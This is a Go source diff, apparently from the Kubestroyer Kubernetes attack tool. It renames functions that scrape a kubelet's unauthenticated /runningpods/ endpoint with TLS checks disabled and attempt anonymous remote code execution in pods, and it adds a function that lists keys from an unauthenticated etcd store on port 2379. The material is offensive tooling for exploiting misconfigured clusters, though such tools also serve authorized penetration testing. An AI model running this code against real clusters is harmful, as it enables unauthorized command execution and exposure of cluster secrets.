@@ -1,18 +1,21 @@
 package pkg
 
 import (
+	"context"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
+	clientv3 "go.etcd.io/etcd/client/v3"
 	"io"
 	"log"
 	"net/http"
 	"strings"
+	"time"
 
 	"github.com/Rolix44/Kubestroyer/utils"
 )
 
-func parse_pod(target string) *utils.RunningPods {
+func parsePod(target string) *utils.RunningPods {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	resp, err := http.Get("https://" + target + ":10250/runningpods/")
 	if err != nil {
@@ -43,7 +46,7 @@ func parse_pod(target string) *utils.RunningPods {
 
 }
 
-func anon_rce(runpod *utils.RunningPods, target string) {
+func anonRce(runpod *utils.RunningPods, target string) {
 	fmt.Printf("Trying anon RCE using '%s' for '%s'\n\n", utils.RceCommand, target)
 
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
@@ -99,4 +102,22 @@ func anon_rce(runpod *utils.RunningPods, target string) {
 
 	fmt.Println(utils.Split)
 
+}
+
+func listEtcdObjects(target string) {
+	cli, err := clientv3.New(clientv3.Config{
+		Endpoints:   []string{target + ":2379"},
+		DialTimeout: 5 * time.Second,
+	})
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer cli.Close()
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	resp, err := cli.Get(ctx, "/", clientv3.WithKeysOnly(), clientv3.WithPrefix())
+	cancel()
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(string(resp.Kvs[0].Key))
 }
